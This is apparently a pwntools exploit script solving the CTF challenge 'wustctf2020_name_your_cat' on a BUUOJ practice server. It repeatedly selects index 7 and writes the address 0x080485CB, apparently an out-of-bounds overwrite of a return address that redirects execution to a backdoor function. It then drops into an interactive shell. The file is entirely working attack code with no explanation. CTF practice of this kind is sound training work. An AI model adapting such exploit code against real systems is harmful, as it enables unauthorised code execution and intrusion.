#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Square_R
#Time: 2021.02.02 08.32.43
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

context.arch = 'i386'

host = '1.1.1.1'
port = 10000
local = 0
if local:
	context.log_level = 'debug'
	# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
	elf = ELF('./wustctf2020_name_your_cat')
	sh = process('./wustctf2020_name_your_cat')
else:
	#context.log_level = 'debug'
	# libc=ELF('/lib/i386-linux-gnu/libc.so.6')
	elf = ELF('./wustctf2020_name_your_cat')
	sh = remote('node3.buuoj.cn',28145)



def pwn():
	sh.sendlineafter("Name for which?\n>",'7')
	# gdb.attach	(sh)
	sh.sendlineafter("Give your name plz: ",p32(0x080485CB))
	sh.sendlineafter("Name for which?\n>",'7')
	sh.sendlineafter("Give your name plz: ",p32(0x080485CB))
	sh.sendlineafter("Name for which?\n>",'7')
	sh.sendlineafter("Give your name plz: ",p32(0x080485CB))
	sh.sendlineafter("Name for which?\n>",'7')
	sh.sendlineafter("Give your name plz: ",p32(0x080485CB))
	sh.sendlineafter("Name for which?\n>",'7')
	sh.sendlineafter("Give your name plz: ",p32(0x080485CB))


if __name__ == '__main__':
	pwn()
	sh.interactive()

